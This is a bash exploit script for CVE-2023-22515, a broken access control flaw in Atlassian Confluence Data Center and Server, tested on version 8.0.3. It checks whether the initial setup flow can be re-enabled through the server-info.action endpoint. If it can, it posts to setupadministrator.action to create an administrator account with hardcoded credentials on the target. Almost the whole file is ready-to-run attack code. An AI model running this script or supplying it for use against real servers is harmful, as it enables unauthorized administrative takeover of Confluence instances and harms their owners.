#!/bin/bash
#Exploit Title: Exploit CVE-2023-22515 (Broken Access Control Vulnerability in Confluence Data Center and Server)
#Tested on: Atlassian Confluence 8.0.3
#Author: Kl3gari
#Usage: ./xpl.sh [URL]
red='\e[01;31m'
null='\e[00m'
yellow='\e[01;33m'
green='\e[01;32m'
bold='\e[01;37m'
user='a123456' # User created
pass='ChangeMe123' # Password created

trap __Ctrl_c__ INT

check_parameter() {
  if [[ -z $1 ]]; then # Check parameter
    echo -e "########################################\n"
    echo -e "${yellow}Usage: $0 [URL]${null}"
    echo -e "\n########################################"
    exit 1
  fi
}

__Ctrl_c__() {
    echo -e "\n${red}Aborting...${null}"
    exit 2
}

xpl() {
  echo -e "[${yellow}INFO${null}] Checking if host is vulnerable..."
  echo ""
  sleep 1
  vuln=$(curl -sD - -k -o /dev/null "$1/server-info.action?bootstrapStatusProvider.applicationConfig.setupComplete=false" -H "X-Atlassian-Token: no-check" | head -n1 | awk '{print $2}') # Reenable the initial setup and get response code from endpoint
  if [[ $vuln == "200" ]]; then # Match response code
    echo -e "${green}Vulnerable${null} --> ${bold}Responde Code:${null} ${green}$vuln${null}"
      sleep 1
      echo -e "\n${yellow}[+] Exploiting Target...${null}"
      exploit=$(curl -sD - -k -o /dev/null -X POST "$1/setup/setupadministrator.action" -d "username=$user&fullName=$user&email=$user%40test.test&password=$pass&confirm=$pass&setup-next-button=Next" -L --proxy http://127.0.0.1:8080 -H "X-Atlassian-Token: no-check") # Create user request
      echo -e "\n${green}[+] Exploit Completed!!!${null}\n"; sleep 0.5
      echo -e "[${yellow}INFO${null}] ${bold}User created:${null} ${yellow}$user${null}"
      echo -e "[${yellow}INFO${null}] ${bold}Password created:${null} ${yellow}$pass${null}"

  else
    echo "I can't identify the version :("
  fi
}

main() {
  check_parameter $1
  xpl $1
}

main "$@"
